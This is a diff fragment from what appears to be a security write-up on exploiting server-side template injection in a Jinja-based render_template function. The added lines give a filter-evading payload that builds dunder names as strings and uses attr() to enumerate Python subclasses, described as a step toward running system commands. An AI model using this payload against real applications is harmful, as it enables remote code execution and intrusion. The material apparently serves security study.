@@ -299,3 +299,15 @@ def render_template(template, context, is_path=None, safe_render=True):
 
 To bypass this filter and reach line `77`—where the Jinja environment renders user input—we’ll need to craft a payload that avoids using `".__"` directly, possibly by using alternative traversal methods or by finding a code path where `safe_render=False`.
 #### SSTI Filter Evasion & Exploitaion
+To accomplish full exploitation, we need to discover the available classes that we can use to run system commands.
+List all available classes:
+```python
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{{ subclasses_r }}
+```
